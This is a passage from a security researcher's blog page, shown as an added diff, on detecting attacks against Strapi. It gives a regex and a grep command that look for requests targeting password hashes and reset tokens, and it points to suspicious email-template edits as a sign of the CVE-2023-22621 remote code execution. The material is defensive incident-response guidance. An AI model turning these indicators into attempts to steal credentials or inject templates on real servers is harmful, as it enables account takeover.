+ <pre><span></span><code><span class="sr">/(\[|%5B)\s*(email|password|reset_password_token|resetPasswordToken)\s*(\]|%5D)/</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ You can search log files for this IoC by using the following
+ <code>
+  grep
+ </code>
+ command.
+</p>
+<div class="codehilite">
+ <pre><span></span><code>grep -iE <span class="s1">'(\[|%5B)\s*(email|password|reset_password_token|resetPasswordToken)\s*(\]|%5D)'</span> <span class="nv">$PATH_TO_LOG_FILE</span>
+</code></pre>
+</div>
+<p>
+ If the above regex patterns matches any lines in your log files, take extra precaution to look out for multiple requests that include
+ <code>
+  password
+ </code>
+ ,
+ <code>
+  reset_password_token
+ </code>
+ or
+ <code>
+  resetPasswordToken
+ </code>
+ .
+ <strong>
+  This would indicate that an attacker has leaked the password hashes and reset tokens on you Strapi server and you need to immediately start incident response!
+ </strong>
+</p>
+<h2 class="major" id="detecting-remote-code-execution-cve-2023-22621">
+ Detecting Remote Code Execution (CVE-2023-22621)
+</h2>
+<p>
+ Using just the request log files, the only IoC to search for is a
+ <code>
+  PUT
+ </code>
+ request to URL path
+ <code>
+  /users-permissions/email-templates
+ </code>
+ . This IoC only indicates that a Strapi email template was modified on your server and by itself does not indicate if your Strapi server has been compromised. If this IoC is detected, you will need to manually review your email templates on your Strapi server and backups of your database to see if any of the templates contain a
+ <code>
+  lodash
+ </code>
+ template delimiter (eg.
+ <code>
+  &lt;%STUFF HERE%&gt;
+ </code>
+ ) that contains suspicious JavaScript code. If you find a suspicious template delimiter but unsure if your server has been compromised, you can
+ <a href="https://twitter.com/GhostCcamm">
+  private message me on Twitter
+ </a>
+ and I will verify if you have been breached when I am available.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="conclusion">
+ Conclusion
+</h1>
+<p>
+ I hope you enjoyed this deep dive into these vulnerabilities that I discovered in Strapi. These types of vulnerabilities are really my type of jam and it was a lot of fun taking on the challenge of bypassing Strapi's email template validation, dumping sensitive user information and bypassing authentication.
+</p>
+<p>
+ Once again, I want to give the Strapi security team a massive thank you for how they handled responding to my security reports. I seldomly see vulnerability disclosure done correctly by an organisation, and this experience was a huge breath of fresh air for me. I wish that other organisations look towards Strapi as an example on how vulnerability disclosure should be handled, because as we always say in the security world...
+</p>
+<p>
+ <em>
+  The poop will eventually hit the fan
+ </em>
+</p>
+<p>
+ <em>
+  Thank you for reading!
+ </em>
+</p></div>
+</div>
+</section>
+</section>
+
+    	</div>
+
+    <!-- Footer -->
+      <!-- Footer -->
+  <section id="footer">
+    <div class="inner">
+      <ul class="icons">
+        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
+        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
+      </ul>
+    </div>
+  </section>
+
+		<!-- Particles -->
+			<div id="particles-js"></div>
+
+		<!-- Scripts -->
+			<script src="/assets/js/jquery.min.js"></script>
+			<script src="/assets/js/jquery.scrollex.min.js"></script>
+			<script src="/assets/js/browser.min.js"></script>
+			<script src="/assets/js/breakpoints.min.js"></script>
+			<script src="/assets/js/util.js"></script>
+			<script src="/assets/js/particles.min.js"></script>
+			<script src="/assets/js/main.js"></script>
+      
+	</body>
+</html>
